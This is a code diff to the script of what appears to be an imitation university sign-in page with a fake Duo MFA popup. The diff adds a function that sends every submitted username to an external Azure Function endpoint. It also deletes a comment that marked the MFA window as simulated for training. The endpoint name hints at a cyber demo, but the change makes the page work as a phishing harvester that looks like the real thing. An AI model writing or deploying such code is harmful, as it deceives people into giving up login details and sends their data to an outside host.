@@ -12,6 +12,24 @@ const step1Title = document.getElementById('step1Title');
 const step2Title = document.getElementById('step2Title');
 const lockCircle = document.getElementById('lockCircle');
 
+// Azure Function Endpoint
+const AZURE_FUNCTION_URL = 'https://fairfielducyberdemo-a3gzbfa2embuf7dd.westus-01.azurewebsites.net/api/SaveText';
+
+async function sendUsernameToAzure(username) {
+  try {
+    await fetch(AZURE_FUNCTION_URL, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({ text: `Username submitted: ${username}` })
+    });
+    console.log('Username sent to Azure successfully');
+  } catch (error) {
+    console.error('Error sending username to Azure:', error);
+  }
+}
+
 function showToast(message) {
   toast.textContent = message;
   toast.classList.add("show");
@@ -32,14 +50,18 @@ usernameForm.addEventListener('submit', (e) => {
   e.preventDefault();
   const name = usernameInput.value && usernameInput.value.trim();
   const usernameError = document.getElementById('usernameError');
+  
   if (!name) {
-    // show inline field error like the screenshot
+    // show inline field error
     if (usernameError) usernameError.style.display = '';
     usernameInput.focus();
     return;
   } else {
     if (usernameError) usernameError.style.display = 'none';
   }
+
+  // Send ONLY the username to Azure Blob Storage
+  sendUsernameToAzure(name);
 
   // Switch UI to password step and display the entered username
   displayUser.textContent = name;
@@ -71,7 +93,7 @@ passwordForm.addEventListener('submit', (e) => {
 
   showToast('Proceeding to Duo device verification...');
 
-  // Open duo device flow; this popup is a simulated MFA window for training.
+  // Open duo device flow
   const features = 'width=520,height=700,toolbar=no,menubar=no,location=no,resizable=yes';
   window.open('duo_device.html', 'Duo - Fairfield Device', features);
 });
